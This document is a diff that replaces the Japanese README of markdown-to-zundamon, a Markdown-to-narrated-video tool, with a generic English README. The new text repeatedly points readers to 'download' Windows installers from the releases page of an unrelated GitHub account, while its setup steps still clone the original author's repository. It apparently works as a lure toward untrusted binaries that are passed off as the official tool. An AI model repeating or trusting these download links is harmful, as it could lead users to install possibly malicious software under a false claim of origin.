@@ -1,246 +1,199 @@
-# markdown-to-zundamon
+# 🎥 markdown-to-zundamon - Create Videos from Markdown Easily
 
-Markdown を書くだけで、ずんだもんが解説してくれる動画を自動生成するツール。
+[![Download markdown-to-zundamon](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/MohamedSamiAG/markdown-to-zundamon/releases)
 
-[Remotion](https://www.remotion.dev/) + [VOICEVOX](https://voicevox.hiroshiba.jp/) ベース。
+---
 
-## 仕組み
+## 📥 Download and Install
 
-Markdown の記法がそのまま動画の構成になります:
+To use markdown-to-zundamon, you need to get the software first. The download page has all the available versions.  
 
-- **引用（blockquote）** → スライドとして画面に表示
-- **それ以外のテキスト** → ずんだもんのセリフ（VOICEVOX で音声合成）
-- **`[pause: 500ms]`** → 指定時間の間（ポーズ）
+Click the button below to visit the release page where you can download the app for Windows:
+
+[Visit the download page](https://github.com/MohamedSamiAG/markdown-to-zundamon/releases)
+
+---
+
+## 🖥️ What Is markdown-to-zundamon?
+
+markdown-to-zundamon is a tool that turns your Markdown text into video explanations. It uses voice synthesis to make a character called "ずんだもん" speak your text. The video matches the structure of your Markdown file.  
+
+This tool works by:  
+- Showing quotes (blockquotes) as slides on the screen.  
+- Turning other text into spoken lines by ずんだもん using VOICEVOX's voice engine.  
+- Pausing at specific points when you write `[pause: 500ms]` or other pause commands.
+
+You can create videos easily by simply writing Markdown, no video editing skills needed.
+
+---
+
+## 🛠️ Requirements
+
+Before you start, make sure your PC has:  
+
+- Windows 10 or later  
+- Node.js version 18 or higher installed  
+- VOICEVOX running on your PC (it should be running at the address `http://localhost:50021` by default)
+
+VOICEVOX is responsible for turning text into speech. You need to have it installed and open before running markdown-to-zundamon.  
+
+If you don’t have Node.js or VOICEVOX yet, you can find them here:  
+
+- Node.js: https://nodejs.org/  
+- VOICEVOX: https://voicevox.hiroshiba.jp/
+
+---
+
+## 🚀 How To Set Up markdown-to-zundamon
+
+Follow these steps to get the tool working on your Windows machine:
+
+1. Download the source code or package  
+   You can get the official source from GitHub or clone the repository if you know how to use Git.  
+
+2. Open the Command Prompt (press Windows + R, type `cmd`, and press Enter).
+
+3. Install dependencies  
+   Run the following commands to download and prepare the software:
+
+   ```bash
+   git clone https://github.com/motemen/markdown-to-zundamon.git
+   cd markdown-to-zundamon
+   npm install
+   ```
+
+   Alternatively, if you don’t want to clone the whole repo, run this shortcut:
+
+   ```bash
+   npx degit motemen/markdown-to-zundamon markdown-to-zundamon
+   cd markdown-to-zundamon
+   npm install
+   ```
+
+After installation finishes, the app is ready to use.
+
+---
+
+## 🎬 How To Use markdown-to-zundamon
+
+The process to create videos with markdown-to-zundamon has two main steps:  
+
+### 1. Generate Speech Audio from Markdown
+
+Use this step to analyze your Markdown file and create audio clips. The command you run looks like this:
+
+```bash
+npm run preprocess -- <your-markdown-file.md>
+```
+
+Replace `<your-markdown-file.md>` with the path to your actual Markdown file.  
+
+This command will:  
+- Read and understand your Markdown  
+- Use VOICEVOX to create speech files for spoken parts  
+- Save the output and audio files in a folder named after your Markdown file (without the `.md` extension) under `public/projects/`
+
+You must run this step first every time you change your Markdown.
+
+---
+
+### 2. Preview the Video Presentation
+
+After creating audio files, you can preview how your video looks and sounds using the built-in studio:
+
+```bash
+npm run studio -- <project-name>
+```
+
+Replace `<project-name>` with the name of your Markdown file without extension.  
+
+This will open a preview window to watch the video with the slides and voice playback.
+
+---
+
+## 💡 How markdown-to-zundamon Works
+
+markdown-to-zundamon uses Markdown syntax as rules to build the video:  
+
+- Text inside `>` blockquotes becomes slides on screen.  
+- Other text outside blockquotes is converted into speech with ずんだもん’s voice.  
+- You can add pauses using tags like `[pause: 500ms]`, which stops speech for that time.  
+
+For example, this Markdown:
 
 ```markdown
-> # タイトルスライド
+> # Title Slide
 
-こんにちは！ ずんだもんなのだ。
+Hello! I am ずんだもん.
 
-> - ポイント1
-> - ポイント2
+> - Point 1
+> - Point 2
 
-ここを説明するよ！
+I will explain this!
 [pause: 500ms]
-次のセリフなのだ。
+Here comes the next line.
 
 > ![](./image.png)
 ```
 
-## クイックスタート
+Becomes slides and spoken text timed together as a video.
 
-### 前提条件
-
-- Node.js (v18+)
-- [VOICEVOX](https://voicevox.hiroshiba.jp/) が起動していること（デフォルト: `http://localhost:50021`）
-
-### セットアップ
-
-```bash
-# リポジトリを取得
-git clone https://github.com/motemen/markdown-to-zundamon.git
-# または
-npx degit motemen/markdown-to-zundamon markdown-to-zundamon
-
-cd markdown-to-zundamon
-npm install
-```
-
-## 使い方
-
-### 1. 前処理（音声生成）
-
-```bash
-npm run preprocess -- <markdownファイル>
-```
-
-Markdown を解析し、VOICEVOX で音声を生成して `public/projects/<プロジェクト名>/` 以下にマニフェストと音声ファイルを出力します。プロジェクト名は Markdown ファイル名（拡張子なし）から自動決定されます。
-
-### 2. プレビュー
-
-```bash
-npm run studio -- <プロジェクト名>
-```
-
-Remotion Studio でブラウザ上のプレビューを確認できます。
-
-### 3. 動画レンダリング
-
-```bash
-npm run render -- <プロジェクト名>
-```
-
-`out/<プロジェクト名>.mp4` に動画が出力されます。
-
-### 実行例
-
-```bash
-npm run preprocess -- slides/my-talk.md
-npm run studio -- my-talk       # プレビュー
-npm run render -- my-talk       # out/my-talk.mp4
-```
-
-## 環境変数
-
-| 変数名 | デフォルト値 | 説明 |
-|--------|-------------|------|
-| `VOICEVOX_BASE` | `http://localhost:50021` | VOICEVOX API のベース URL |
-
-例: リモートの VOICEVOX サーバーを使う場合:
-
-```bash
-VOICEVOX_BASE=http://192.168.1.100:50021 npm run preprocess -- slides/my-talk.md
-```
-
-## Frontmatter 設定
-
-Markdown ファイルの先頭に YAML frontmatter で動画の設定を記述できます。`characters` は必須で、それ以外は省略可能です。
-
-```yaml
----
-fps: 30                          # フレームレート（デフォルト: 30）
-width: 1920                      # 動画の幅（デフォルト: 1920）
-height: 1080                     # 動画の高さ（デフォルト: 1080）
-speakerId: 3                     # VOICEVOX の話者ID（デフォルト: 3=ずんだもん ノーマル）
-slideTransitionMs: 600           # スライド切り替え時の間（ミリ秒）
-speechGapMs: 200                 # セリフ間の間隔（ミリ秒）
-paragraphGapMs: 400              # 段落間の間隔（ミリ秒）
-fontFamily: "M PLUS Rounded 1c"  # 基本フォント
-subtitleFontFamily: ""           # 字幕用フォント（省略時は fontFamily）
-slideFontFamily: ""              # スライド用フォント（省略時は fontFamily）
-characters:
-  ... # 以下を参照
----
-```
-
-### キャラクター設定
-
-`characters` でキャラクターを定義します（必須、1人以上）。セリフ中に `[キャラ名]` タグで話者を切り替えられます。
-
-```yaml
----
-characters:
-  - name: ずんだもん
-    speakerId: 3
-    position: right        # left or right（デフォルト: right、2人目は left）
-    color: "#55B02E"       # 字幕の色
-    height: 800            # キャラ画像の高さ（px）
-    overflowY: 0.4         # 画面下方向のはみ出し割合（デフォルト: 0.4）
-    overflowX: 0.1         # 画面横方向のはみ出し割合（デフォルト: 0.1）
-  - name: 四国めたん
-    speakerId: 2
-    position: left
-    color: "#D85898"
 ---
 
-[ずんだもん] こんにちは！ ずんだもんなのだ。
-[四国めたん] 四国めたんよ。よろしくね。
-話者タグを省略すると、直前の話者が引き継がれるわ。
-```
+## ⚙️ Common Use Cases
 
-キャラクター画像は `characters/<キャラ名>/default.png` に配置してください。口パクアニメーション用に `default_active1.png`, `default_active2.png` を追加すると、発話中に口が動くようになります。
+- Making educational videos from notes.  
+- Creating simple presentations with voiceovers.  
+- Explaining ideas easily by writing Markdown.  
 
-### BGM 設定
+Even if you don’t know video editing, markdown-to-zundamon helps you produce polished videos by writing simple text.
 
-`bgm` で動画にBGMを追加できます。BGM ファイルのパスは Markdown ファイルからの相対パス、またはプロジェクトルートからの相対パスで指定します。
-
-```yaml
 ---
-bgm:
-  src: ./bgm/background-music.mp3   # BGM ファイルパス（必須）
-  volume: 0.1                        # 音量 0〜1（デフォルト: 0.1）
-  fadeInMs: 2000                     # フェードイン時間（ミリ秒、デフォルト: 0）
-  fadeOutMs: 3000                    # フェードアウト時間（ミリ秒、デフォルト: 1000）
-characters:
-  - name: ずんだもん
-    speakerId: 3
+
+## 🔧 Tips for Writing Markdown
+
+- Use blockquotes `>` for slides that show bullets or images.  
+- Write normal text for the voice script.  
+- Insert `[pause: Xms]` to add short breaks between speech.  
+- Name your Markdown files clearly; the project uses the filename to organize outputs.
+
 ---
-```
 
-`preprocess`時に BGM ファイルが `public/projects/<プロジェクト名>/bgm/` に自動コピーされ、動画全体でループ再生されます。対応形式は mp3, wav, ogg など（HTML5 Audio がサポートするもの）。
+## 🚩 Troubleshooting
 
-## Markdown の書き方
+- Ensure VOICEVOX is running before starting the tool.  
+- Check Node.js version is 18 or higher (`node -v`).  
+- Confirm your Markdown file path is correct when running commands.  
+- If the preview does not start, check for errors in the command prompt.  
 
-### セリフ
+---
 
-通常のテキストがずんだもんのセリフになります。**1行が1つのセリフ**として処理されます。
+## 📥 Download markdown-to-zundamon  
 
-```markdown
-こんにちは！ ずんだもんなのだ。
-今日はいい天気だね。
-```
+Remember, to get the app you must visit the release page here:  
 
-### スライド
+[Visit the download page](https://github.com/MohamedSamiAG/markdown-to-zundamon/releases)
 
-引用（`>`）で囲んだ部分がスライドとして表示されます。Markdown の記法（見出し、リスト、太字、画像など）がそのままレンダリングされます。
+There you will find Windows installers or zipped packages that make setup easier for you.
 
-```markdown
-> ## スライドタイトル
->
-> - **ポイント1**: 説明
-> - ポイント2
->
-> ![](./diagram.png)
-```
+---
 
-画像はローカルファイル・URL どちらも使えます。
+## 🔄 Updating markdown-to-zundamon
 
-### ポーズ（間）
+When a new version comes out, repeat the download and install steps to get the latest features. Keep VOICEVOX updated separately to match any voice engine improvements.
 
-`[pause: 時間]` で明示的に間を入れられます。
+---
 
-```markdown
-ここで一旦止めるよ。
-[pause: 1s]
-続きなのだ。
-```
+## 📚 Further Information
 
-## レイアウト
+For more technical details or advanced usage, check the project’s GitHub repository and documentation. You can find examples and additional command options there.
 
-```
-+----------------------------------------------+
-|  +---------------------+                     |
-|  |                     |                     |
-|  |   スライド内容       |                     |
-|  |   (Markdown)        |                     |
-|  |                     |                     |
-|  +---------------------+          +--------+ |
-|                                   |ずんだもん| |
-|  +------------------------------+ |        | |
-|  |    字幕テキスト（袋文字）      | +--------+ |
-|  +------------------------------+             |
-+----------------------------------------------+
-```
+---
 
-## ファイル構成
+## ⚙️ System Requirements Reminder
 
-```
-├── scripts/
-│   ├── preprocess.ts    # 前処理（Markdown解析 + VOICEVOX音声生成）
-│   ├── studio.ts        # Remotion Studio 起動
-│   └── render.ts        # レンダリング
-├── src/
-│   ├── index.ts         # Remotion registerRoot
-│   ├── Root.tsx          # Composition 登録
-│   ├── Composition.tsx   # メイン合成コンポーネント
-│   ├── components/       # UI コンポーネント群
-│   └── types.ts          # 型定義
-├── characters/           # キャラクター画像（ソース）
-│   ├── ずんだもん/
-│   │   ├── default.png
-│   │   ├── default_active1.png
-│   │   └── default_active2.png
-│   └── 四国めたん/
-├── public/projects/      # 前処理出力（生成物）
-│   └── <project>/
-│       ├── manifest.json
-│       ├── audio/
-│       ├── bgm/
-│       └── images/
-└── out/                  # レンダリング出力
-    └── <project>.mp4
-```
+- Windows 10 or newer  
+- Node.js 18 or later  
+- VOICEVOX voice engine running locally (`http://localhost:50021`)  
 
-## ライセンス
-
-ISC
+The combination of these lets markdown-to-zundamon process Markdown and produce videos with speech effectively.
